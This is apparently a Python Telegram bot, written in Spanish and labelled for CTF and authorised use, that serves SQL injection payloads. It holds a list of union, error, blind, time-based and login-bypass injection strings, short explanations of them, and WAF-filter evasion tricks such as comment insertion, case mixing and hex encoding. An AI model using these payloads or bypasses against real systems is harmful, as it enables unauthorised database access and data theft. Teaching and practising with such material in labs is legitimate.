#!/usr/bin/env python3
"""
tg_05_sqli_builder.py — CTF: Constructor de payloads SQLi para Telegram
SOLO PARA SISTEMAS AUTORIZADOS / EDUCATIVO / CTF.
MODIFICAR: agregar más payloads en PAYLOADS.
"""
import logging, os
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
logging.basicConfig(format="%(asctime)s [%(levelname)s] %(message)s", level=logging.INFO)

# MODIFICAR: agregar más payloads de CTF
PAYLOADS = {
    "union":  ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "1 UNION SELECT table_name FROM information_schema.tables--"],
    "error":  ["'", "' OR '1'='1", "' OR 1=1--", "' OR 1=1#"],
    "blind":  ["' AND 1=1--", "' AND 1=2--", "' AND SLEEP(5)--"],
    "time":   ["'; WAITFOR DELAY '0:0:5'--", "' OR SLEEP(5)--", "1; SELECT pg_sleep(5)--"],
    "auth":   ["admin'--", "' OR '1'='1'--", "admin' /*", "') OR ('1'='1"],
}

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "\U0001F6E1 SQLi Builder — Solo CTF/sistemas autorizados\n\n"
        "/sqli <tipo> — (union|error|blind|time|auth)\n"
        "/explain <payload>\n/bypass <filtro>"
    )

async def sqli_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        await update.message.reply_text("Tipos: " + ", ".join(PAYLOADS.keys()))
        return
    tipo     = ctx.args[0].lower()
    payloads = PAYLOADS.get(tipo)
    if not payloads:
        await update.message.reply_text(f"Tipo desconocido. Disponibles: {', '.join(PAYLOADS.keys())}")
        return
    lines = [f"\U0001F4CB Payloads SQLi ({tipo}):"] + [f"  {p}" for p in payloads]
    await update.message.reply_text("\n".join(lines))

async def explain_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    if not ctx.args:
        return
    payload = " ".join(ctx.args)
    # MODIFICAR: agregar más explicaciones
    exps = {
        "OR":    "Condición siempre verdadera — bypasea autenticación básica",
        "UNION": "Combina resultados para extraer datos de otras tablas",
        "SLEEP": "Time-based blind SQLi — detecta inyección por delay",
        "DROP":  "Destructivo — borra la tabla completa",
        "--":    "Comentario SQL — ignora el resto de la query",
    }
    for key, exp in exps.items():
        if key.upper() in payload.upper():
            await update.message.reply_text(f"\U0001F4A1 {payload}\n\n{exp}")
            return
    await update.message.reply_text("MODIFICAR: agregar explicación para este payload.")

async def bypass_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    filtro = " ".join(ctx.args) if ctx.args else "genérico"
    # MODIFICAR: agregar más técnicas de bypass según el WAF
    await update.message.reply_text(
        f"\U0001F6A7 Bypass para: {filtro}\n\n"
        "Comentarios: /*comment*/ o /*!comment*/\n"
        "Case mixing: SeLeCt, uNiOn\n"
        "URL encode: %27=', %20=espacio\n"
        "Hex: 0x61646d696e = 'admin'\n"
        "Concat: CONCAT(0x61,0x64,0x6d,0x69,0x6e)"
    )

def main() -> None:
    if not TOKEN:
        raise ValueError("TELEGRAM_BOT_TOKEN no está configurado en .env")
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("sqli", sqli_cmd))
    app.add_handler(CommandHandler("explain", explain_cmd))
    app.add_handler(CommandHandler("bypass", bypass_cmd))
    app.run_polling()

if __name__ == "__main__":
    main()
